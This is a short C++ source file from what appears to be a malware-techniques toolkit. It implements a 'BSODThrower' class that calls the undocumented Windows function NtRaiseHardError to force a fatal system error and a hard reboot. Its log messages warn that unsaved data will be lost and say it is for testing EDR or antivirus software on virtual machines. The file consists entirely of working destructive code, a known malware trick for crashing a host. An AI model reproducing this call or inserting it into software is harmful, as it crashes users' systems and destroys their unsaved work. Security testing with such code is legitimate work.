#include "bsod_thrower.h"
#include "../MalwareTechniques/ntdll.h"
#include "../Logger/logger.h"

#include <Windows.h>

#include <iostream>

namespace maltech {

    namespace bsod {

        BSODThrower::BSODThrower(ntdll::NtDll& ntdll)
            : ntdll_(ntdll)
        {
        }

        void BSODThrower::TriggerHardError() {
            LOG_CRITICAL("WARNING!!!");
            LOG_CRITICAL("This feature will send a FATAL system error!!!");
            LOG_CRITICAL("This will HARD REBOOT your operating system!!!");
            LOG_CRITICAL("All unsaved data will be lost!!!");
            LOG_CRITICAL("PLEASE use it ONLY on Virtual Machine for testing you EDR or AV system");

            ULONG response;
            ntdll_.NtRaiseHardError(
                STATUS_SYSTEM_PROCESS_TERMINATED,
                0,
                0,
                NULL,
                6,
                &response
            );
        }

    }

}